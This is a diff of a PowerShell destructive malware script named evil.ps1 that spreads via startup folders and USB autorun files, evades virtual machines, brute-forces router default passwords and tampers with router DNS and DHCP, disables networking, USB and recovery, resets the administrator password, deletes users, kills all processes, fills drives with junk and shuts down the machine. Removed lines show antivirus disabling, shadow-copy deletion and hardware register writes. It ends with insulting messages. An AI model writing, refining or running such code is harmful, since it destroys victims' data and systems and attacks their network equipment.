@@ -18,16 +18,15 @@ function Stop-CriticalDriver {
     Set-PendingDelete "C:\Windows\System32\drivers\$Driver.sys"
 }
 
-$vmDrivers = @("vmx86", "vmmouse", "vmusb", "vmci", "hgfs", "vmmemctl", "VBoxGuest", "VBoxMouse", "VBoxSF", "VBoxVideo")
+$vmDrivers = @("vmx86","vmmouse","vmusb","vmci","hgfs","vmmemctl","VBoxGuest","VBoxMouse","VBoxSF","VBoxVideo")
 foreach ($d in $vmDrivers) { try { sc stop $d 2>$null; sc delete $d 2>$null } catch {} }
 
-for ($i=0; $i -lt (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors; $i++) {
+for ($i=0;$i -lt (Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors;$i++) {
     Start-Job -ScriptBlock { while($true){$a=1..1000000|ForEach-Object{$_*$_} } } | Out-Null
 }
-for ($i=0; $i -lt 50; $i++) { Start-Process calc.exe -WindowStyle Hidden -EA 0 }
+for ($i=0;$i -lt 50;$i++) { Start-Process calc.exe -WindowStyle Hidden -EA 0 }
 Start-Job -ScriptBlock { while($true){ Get-WmiObject Win32_Processor | Out-Null; Start-Sleep -Milliseconds 50 } } | Out-Null
 
-$scriptContent = Get-Content $PSCommandPath -Raw
 $paths = @(
     "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1",
     "$env:USERPROFILE\Documents\evil.ps1",
@@ -55,9 +54,20 @@ $gateway = $null
 try { $gateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" -EA 0).NextHop } catch {}
 if (-NOT $gateway) { try { $gateway = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.DefaultIPGateway }).DefaultIPGateway[0] } catch {} }
 if (-NOT $gateway) { try { $gateway = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway }).IPv4DefaultGateway.NextHop } catch {} }
+
 if ($gateway) {
-    $rebootUrls = @("http://$gateway/reboot","http://$gateway/reset","http://$gateway/userRpm/SysRebootRpm.htm","http://$gateway/goform/reboot","http://$gateway/rebootinfo.cgi")
-    foreach ($url in $rebootUrls) { try { Invoke-WebRequest -Uri $url -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {} }
+    $routerPasswords = @("", "admin", "password", "1234", "root", "toor", "Admin", "123456", "qwerty", "1111111", "pass", "admin123")
+    $routerIPs = @($gateway, "192.168.0.1", "192.168.1.1", "192.168.2.1", "10.0.0.1")
+    foreach ($ip in $routerIPs) {
+        foreach ($pass in $routerPasswords) {
+            try { Invoke-WebRequest -Uri "http://$ip/reboot" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
+            try { Invoke-WebRequest -Uri "http://$ip/reset" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
+            try { Invoke-WebRequest -Uri "http://$ip/userRpm/SysRebootRpm.htm" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
+            try { Invoke-WebRequest -Uri "http://$ip/goform/reboot" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
+            try { Invoke-WebRequest -Uri "http://$ip/goform/setDHCP?enable=0" -Method GET -TimeoutSec 2 -EA 0 } catch {}
+            try { Invoke-WebRequest -Uri "http://$ip/goform/setDNS?dns=0.0.0.0" -Method GET -TimeoutSec 2 -EA 0 } catch {}
+        }
+    }
 }
 
 $subnet = $null
@@ -137,66 +147,19 @@ Get-NetAdapter | Where-Object { $_.Name -ne "Loopback" } | ForEach-Object { Disa
 netsh wlan delete profile * 2>$null
 netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound 2>$null
 
-$winRing0Path = Join-Path $PSScriptRoot "WinRing0x64.dll"
-if (Test-Path $winRing0Path) {
-    try {
-        $wr0 = @"
-using System;
-using System.Runtime.InteropServices;
-public class WRO {
-    [DllImport("WinRing0x64.dll")] public static extern bool InitializeOls();
-    [DllImport("WinRing0x64.dll")] public static extern void DeinitializeOls();
-    [DllImport("WinRing0x64.dll")] public static extern bool WriteIoPortByte(ushort Port, byte Data);
-    [DllImport("WinRing0x64.dll")] public static extern bool WriteMsr(uint Index, ulong Value);
-}
-"@
-        Add-Type $wr0 -EA 0
-        [WRO]::InitializeOls() | Out-Null
-        $cpu = (Get-WmiObject Win32_Processor).Name
-        if ($cpu -match "Atom") { [WRO]::WriteMsr(0x1FC, 0) } else { [WRO]::WriteMsr(0x1A0, 0); [WRO]::WriteMsr(0x1B0, [UInt64]::MaxValue) }
-        $ecPorts = @(0x66,0x62), @(0x68,0x6C), @(0x290,0x291)
-        foreach($ec in $ecPorts) { try { [WRO]::WriteIoPortByte($ec[0],0x81); [WRO]::WriteIoPortByte($ec[1],0x00); [WRO]::WriteIoPortByte($ec[0],0x81); [WRO]::WriteIoPortByte($ec[1],0xFF) } catch {} }
-        [WRO]::DeinitializeOls()
-    } catch {}
-}
-
-try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -Force -EA 0
-    Set-MpPreference -DisableTamperProtection $true -Force -EA 0
-    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>$null
-    reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f 2>$null
-} catch {}
-try { Get-WmiObject -Class Win32_ShadowCopy | ForEach-Object { $_.Delete() }; vssadmin delete shadows /all /quiet } catch {}
 try {
     @("USBSTOR","USBHUB3","USBXHCI") | ForEach-Object { reg add "HKLM\SYSTEM\CurrentControlSet\Services\$_" /v Start /t REG_DWORD /d 4 /f 2>$null; Set-PendingDelete "C:\Windows\System32\drivers\$_.sys" }
     Get-PnpDevice -Class USB | Disable-PnpDevice -Confirm:$false -Force -EA 0
 } catch {}
+
 try { $randomPass = -join ((65..90)+(97..122)+(48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ }); net user Administrator $randomPass 2>$null } catch {}
 try { Get-LocalUser | Where-Object { $_.Name -ne "Administrator" -and $_.Name -ne $env:USERNAME } | Remove-LocalUser -Force -EA 0 } catch {}
 try { for ($j=1;$j -le 5000;$j++) { $fakeIP = "192.168.1.$j"; arp -s $fakeIP "00-00-00-00-00-00" 2>$null } } catch {}
 try { $drives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }; foreach ($d in $drives) { $letter = $d.DeviceID; Copy-Item $PSCommandPath "${letter}\evil.ps1" -Force -EA 0; @("[AutoRun]","open=powershell.exe -ExecutionPolicy Bypass -File evil.ps1 -Force","action=Open folder to view files") | Out-File "${letter}\autorun.inf" -Force } } catch {}
-if ($gateway) { try { Invoke-WebRequest -Uri "http://$gateway/goform/setDNS?dns=8.8.8.8&backup=0.0.0.0" -Method GET -TimeoutSec 2 -EA 0 } catch {} }
-try { msg * /server:$gateway "Your PC has been hacked by EVIL" } catch {}
-try { Get-ChildItem Cert:\CurrentUser\My | Remove-Item -EA 0; Get-ChildItem Cert:\LocalMachine\My | Remove-Item -EA 0 } catch {}
 try { reagentc /disable 2>$null; Remove-Item "C:\Windows\System32\Recovery\WinRE.wim" -Force -EA 0 } catch {}
 try { taskkill /f /fi "status eq running" /im *.* /t 2>$null } catch {}
 try { net share * /delete 2>$null } catch {}
-$antiviruses = @("C:\Program Files\Windows Defender\MsMpEng.exe","C:\Program Files\AVAST Software\Avast\AvastSvc.exe")
-foreach ($av in $antiviruses) { if (Test-Path $av) { try { $null = [IO.File]::WriteAllBytes($av, [byte[]]::new(1MB)) } catch {} } }
-$bsod = @'
-Add-Type -AssemblyName System.Windows.Forms
-$form = New-Object System.Windows.Forms.Form
-$form.WindowState = 'Maximized'; $form.TopMost = $true; $form.BackColor = 'Blue'
-$label = New-Object System.Windows.Forms.Label
-$label.Text = ":( Your PC ran into a problem and needs to restart.`nStop code: EVIL_7_NEWGEN_TOTAL"
-$label.ForeColor = 'White'; $label.Font = 'Consolas,20'
-$form.Controls.Add($label); $form.ShowDialog()
-'@
-try { Start-Job -ScriptBlock $bsod } catch {}
-try { bcdedit /bootsequence {memdiag}; shutdown /r /f /t 5 } catch {}
 try { sc config wuauserv start= disabled; sc stop wuauserv; sc config bits start= disabled; sc stop bits } catch {}
-try { vssadmin delete shadows /all /quiet } catch {}
-try { reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_DWORD /d 0 /f 2>$null; reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DisableLogon /t REG_DWORD /d 1 /f 2>$null } catch {}
 $fillBlock = New-Object byte[] (1024); for ($letter=67; $letter -le 90; $letter++) { $drive = [char]$letter + ":\"; if (Test-Path $drive) { for ($f=0; $f -lt 200000; $f++) { try { [IO.File]::WriteAllBytes("$drive\fill_$f.bin", $fillBlock) } catch { break } } } }
 
 $asciiSkull = @"
@@ -217,7 +180,7 @@ for ($i=0;$i -lt 3;$i++) { [Console]::Beep(666,500); Start-Sleep -Milliseconds 2
 
 Write-Host "ахахах соси хуй лошара" -ForegroundColor Red
 Write-Host "suck my ass" -ForegroundColor Red
+Write-Host "Вы добровольно запустили этот файл) by. evil" -ForegroundColor White
 
 Set-PendingDelete $PSCommandPath
 Stop-Computer -Force
-
